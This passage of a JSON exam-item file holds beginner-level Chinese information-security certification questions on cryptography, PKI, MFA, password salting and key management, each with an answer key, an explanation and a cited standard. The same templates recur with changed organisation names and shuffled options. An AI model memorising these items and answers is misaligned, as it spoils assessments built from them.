      "D. 伺服器的私鑰（Server's Private Key）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-533",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 伺服器身分鑑別",
      "B. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "C. 資料機密性（Confidentiality）加密",
      "D. 交易不可否認性"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-534",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）",
      "B. 建立 VPN 虛擬私人通道",
      "C. 對稱式 AES-128 加密",
      "D. 設定高強度資料庫密碼"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-535",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. Telnet 協定",
      "B. OCSP（線上憑證狀態協定）",
      "C. DNS 解析協定",
      "D. SMTP 郵件傳輸協定"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-536",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "B. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "C. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）",
      "D. 英文密碼 ＋ 數字密碼（兩者皆為所知）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-537",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 減少資料庫儲存空間",
      "B. 加快密碼雜湊運算速度以降低 CPU 負擔",
      "C. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "D. 讓密碼可以在遺忘時輕鬆還原明文"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-538",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能讓傳輸速度提升 100 倍",
      "D. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-539",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰",
      "B. 只要沒被偷就可以永久使用無需變更",
      "C. 降低金鑰長度至 56-bit",
      "D. 將金鑰直接張貼於內部公告欄以利備份"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-540",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某知名大型網路電商平台為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所持（Something you have）",
      "B. 所處（Somewhere you are）",
      "C. 所具（Something you are）",
      "D. 所知（Something you know）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-541",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. Caesar 凱薩密碼",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-542",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國立頂尖研究型大學規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的私鑰",
      "B. 客戶端自己的公鑰",
      "C. 伺服器的公鑰（Server's Public Key）",
      "D. 伺服器的私鑰（Server's Private Key）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-543",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 伺服器身分鑑別",
      "B. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "C. 交易不可否認性",
      "D. 資料機密性（Confidentiality）加密"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-544",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 設定高強度資料庫密碼",
      "B. 建立 VPN 虛擬私人通道",
      "C. 對稱式 AES-128 加密",
      "D. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-545",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. DNS 解析協定",
      "B. SMTP 郵件傳輸協定",
      "C. OCSP（線上憑證狀態協定）",
      "D. Telnet 協定"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-546",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某高科技晶圓代工大廠為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "B. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "C. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "D. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-547",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "B. 讓密碼可以在遺忘時輕鬆還原明文",
      "C. 減少資料庫儲存空間",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-548",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能讓傳輸速度提升 100 倍",
      "B. 能夠防止受害者遭遇釣魚網站欺騙",
      "C. 能夠完全取代防火牆",
      "D. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-549",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 將金鑰直接張貼於內部公告欄以利備份",
      "B. 只要沒被偷就可以永久使用無需變更",
      "C. 降低金鑰長度至 56-bit",
      "D. 定期執行金鑰輪替（Key Rotation），生成新金鑰並汰換老舊金鑰"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "金鑰有其安全生命週期（Cryptoperiod），長期不更換會增加金鑰洩漏與密文累積遭分析破解之風險，必須依規定期輪替（Rotation）。",
    "trap": "金鑰管理必須包含生成、使用、存儲、輪替、撤銷到銷毀的全生命週期控管。",
    "law": "NIST SP 800-57 金鑰管理指引"
  },
  {
    "id": "IPAS-B-550",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心為高階主管配發 FIDO2 硬體安全金鑰進行登入驗證。依據驗證因子三要素，此實體硬體金鑰屬於何種類別？",
    "options": [
      "A. 所處（Somewhere you are）",
      "B. 所具（Something you are）",
      "C. 所知（Something you know）",
      "D. 所持（Something you have）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "FIDO2",
        "zh": "快速線上身分識別 2.0",
        "ipa": "/ˈfaɪ.doʊ tuː/"
      }
    ],
    "explanation": "實體硬體金鑰（如 YubiKey、智慧卡、USB Token）屬於使用者持有的實體載具，歸類為『所持』因子。",
    "trap": "若金鑰本身附帶指紋辨識，則結合了所持與所具雙因子。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-551",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心資料工程師需要對儲存於磁碟陣列中高達 10TB 的顧客交易歷史資料進行全量靜態加密（Data at Rest Encryption）。考量大量資料加密的運算效能與安全強度，最適當之加密演算法為：",
    "options": [
      "A. RSA-4096（非對稱演算法）",
      "B. Caesar 凱薩密碼",
      "C. AES-256（進階加密標準，具極高運算效能與強安全性）",
      "D. MD5（單向雜湊演算法）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "AES-256 為對稱式區塊加密，運算極為迅速且耗費資源少，是大量資料（Data at Rest）加密的首選；非對稱加密過於緩慢不適於大資料直接加密。",
    "trap": "切勿選擇 RSA 進行全量大資料儲存加密，效率會嚴重低落。",
    "law": "NIST SP 800-175B"
  },
  {
    "id": "IPAS-B-552",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心規劃於網際網路上由客戶端向伺服器安全傳送機密合約，若採用 RSA 非對稱加密機制確保該合約「僅有伺服器能夠解密閱讀」，客戶端應使用何種金鑰進行加密？",
    "options": [
      "A. 客戶端自己的私鑰",
      "B. 客戶端自己的公鑰",
      "C. 伺服器的私鑰（Server's Private Key）",
      "D. 伺服器的公鑰（Server's Public Key）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "RSA",
        "zh": "RSA 非對稱加密演算法",
        "ipa": "/ˌɑːr.esˈeɪ/"
      }
    ],
    "explanation": "機密傳輸原則：使用『接收方的公鑰』加密，唯有持有對應私鑰的接收方（伺服器）方能解密閱讀。",
    "trap": "私鑰絕不可公開給他人使用，公鑰才是公開給大眾加密傳給自己。",
    "law": "PKI 基礎原理"
  },
  {
    "id": "IPAS-B-553",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某金流與行動支付科技公司軟體發布平台為讓使用者下載安裝檔時能夠驗證軟體在傳輸過程中未遭惡意竄改，在官方網站上公佈了安裝檔的 SHA-256 雜湊值。此應用主要利用了雜湊函數的何種安全特性？",
    "options": [
      "A. 交易不可否認性",
      "B. 資料機密性（Confidentiality）加密",
      "C. 資料完整性（Integrity）驗證，確保檔案未遭竄改或損毀",
      "D. 伺服器身分鑑別"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Confidentiality",
        "zh": "機密性",
        "ipa": "/ˌkɑːn.fə.den.ʃiˈæl.ə.t̬i/"
      },
      {
        "en": "Integrity",
        "zh": "完整性",
        "ipa": "/ɪnˈteɡ.rə.t̬i/"
      },
      {
        "en": "SHA-256",
        "zh": "安全雜湊演算法 256 位元",
        "ipa": "/ʃɑː tuː fɪf.ti sɪks/"
      }
    ],
    "explanation": "雜湊函數具單向性與抗碰撞性，檔案遭竄改哪怕 1 個 bit 雜湊值即劇烈改變，因此適合用作完整性比對校驗。",
    "trap": "單純提供 Hash 無法達成不可否認性（因未綁定個人私鑰簽章）。",
    "law": "NIST FIPS 180-4"
  },
  {
    "id": "IPAS-B-554",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心為推動電子採購系統，要求投標廠商送出的標單必須具備法律證據能力，確保標單內容未被變造且廠商事後無法推諉否認投標。該系統必須採用下列何種密碼學機制？",
    "options": [
      "A. 建立 VPN 虛擬私人通道",
      "B. 設定高強度資料庫密碼",
      "C. 數位簽章（Digital Signature，利用投標廠商專屬私鑰簽署）",
      "D. 對稱式 AES-128 加密"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "AES",
        "zh": "進階加密標準 (對稱式)",
        "ipa": "/ˌeɪ.iːˈes/"
      },
      {
        "en": "Digital Signature",
        "zh": "數位簽章",
        "ipa": "/ˈdɪdʒ.ə.t̬əl ˈsɪɡ.nə.tʃɚ/"
      }
    ],
    "explanation": "數位簽章結合非對稱密碼學私鑰專屬性與 Hash 完整性，兼具完整性、真實性與法律上的不可否認性。",
    "trap": "對稱加密雙方皆有金鑰，事後雙方皆可推諉是對方偽造。",
    "law": "《電子簽章法》第9條"
  },
  {
    "id": "IPAS-B-555",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某區域教學醫學中心內部伺服器申請了一張由知名商用 CA 簽發之 SSL 數位憑證，當訪客瀏覽器連線時出現「憑證已撤銷（Certificate Revoked）」之警告。瀏覽器最可能是透過何種協定即時查詢得知該憑證已被註銷？",
    "options": [
      "A. OCSP（線上憑證狀態協定）",
      "B. DNS 解析協定",
      "C. SMTP 郵件傳輸協定",
      "D. Telnet 協定"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "CA",
        "zh": "憑證授權中心",
        "ipa": "/ˌsiːˈeɪ/"
      },
      {
        "en": "OCSP",
        "zh": "線上憑證狀態協定",
        "ipa": "/ˌoʊ.siː.esˈpiː/"
      }
    ],
    "explanation": "OCSP 提供即時、輕量之線上查詢機制，瀏覽器可向 CA 之 OCSP Responder 查詢單張憑證目前是否已被撤銷。",
    "trap": "CRL 檔案龐大且更新具時間延遲，OCSP 反應更即時。",
    "law": "RFC 6960"
  },
  {
    "id": "IPAS-B-556",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商為防止遠端辦公同仁的帳密在網路釣魚事件中遭竊取並被直接登入，資訊長下令所有遠端 VPN 連線必須全面導入多因素驗證（MFA）。下列何種驗證組合符合真正之 MFA 規範？",
    "options": [
      "A. 員工工號 ＋ 身份證字號（兩者皆為所知）",
      "B. 英文密碼 ＋ 數字密碼（兩者皆為所知）",
      "C. 網域帳號密碼（所知）＋ 手機 Authenticator App 產生的動態 OTP（所持）",
      "D. 網域帳號密碼 ＋ 個人提款卡密碼（兩者皆為所知）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "VPN",
        "zh": "虛擬私人網路",
        "ipa": "/ˌviː.piːˈen/"
      },
      {
        "en": "MFA",
        "zh": "多因素驗證",
        "ipa": "/ˌem.efˈeɪ/"
      }
    ],
    "explanation": "真正的 MFA 必須跨越不同類別（例如所知 + 所持，或所知 + 所具）。若輸入兩次密碼依然屬於同一維度（Something you know）。",
    "trap": "考題常以「密碼 + 媽媽娘家姓氏」誘騙考生，兩者本質皆為所知，非 MFA。",
    "law": "NIST SP 800-63B"
  },
  {
    "id": "IPAS-B-557",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心在進行資料庫密碼安全性盤點時，工程師建議密碼雜湊運算時必須強制為每位使用者加入唯一的「鹽（Salt）」。加入 Salt 的最核心防禦目的為何？",
    "options": [
      "A. 讓密碼可以在遺忘時輕鬆還原明文",
      "B. 減少資料庫儲存空間",
      "C. 使相同密碼的使用者產生截然不同的雜湊值，徹底瓦解預先計算之彩虹表攻擊",
      "D. 加快密碼雜湊運算速度以降低 CPU 負擔"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "加鹽（Salt）為每位使用者附加一串隨機亂數再計算 Hash，使預先算好的彩虹表完全失效，攻擊者必須針對每筆帳號個別暴力破解。",
    "trap": "Salt 並非密鑰，可以直接明文存放在資料庫中。",
    "law": "OWASP 密碼儲存安全備忘錄"
  },
  {
    "id": "IPAS-B-558",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安架構師在評估企業 TLS 通訊安全時，強調加密套件必須具備「前向保密性（PFS, Perfect Forward Secrecy）」。具備 PFS 的核心優勢在於：",
    "options": [
      "A. 能夠完全取代防火牆",
      "B. 能讓傳輸速度提升 100 倍",
      "C. 即使日後伺服器長效私鑰遭洩漏，攻擊者亦無法解密過往已攔截儲存的歷史加密連線內容",
      "D. 能夠防止受害者遭遇釣魚網站欺騙"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "TLS",
        "zh": "傳輸層安全性協定",
        "ipa": "/ˌtiː.elˈes/"
      }
    ],
    "explanation": "前向保密（PFS）在每次工作階段中動態生成一次性臨時金鑰（如 DHE/ECDHE），長效私鑰僅用於身分驗證，私鑰洩漏無法回溯推導工作階段金鑰。",
    "trap": "非常關鍵的現代加密標準考點。",
    "law": "RFC 8446 TLS 1.3 核心要求"
  },
  {
    "id": "IPAS-B-559",
    "level": "初級",
    "subject": "考科二：資訊安全防護實務",
    "domain": "密碼學基礎、金鑰管理與身分認證",
    "scenario": true,
    "question": "某公務機關資訊處內部加密主機使用的對稱式主金鑰（Master Key）已持續使用超過三年從未變更。依據金鑰生命週期管理（Key Lifecycle Management）規範，資安長應要求採取何種措施？",
    "options": [
      "A. 只要沒被偷就可以永久使用無需變更",
      "B. 將金鑰直接張貼於內部公告欄以利備份",
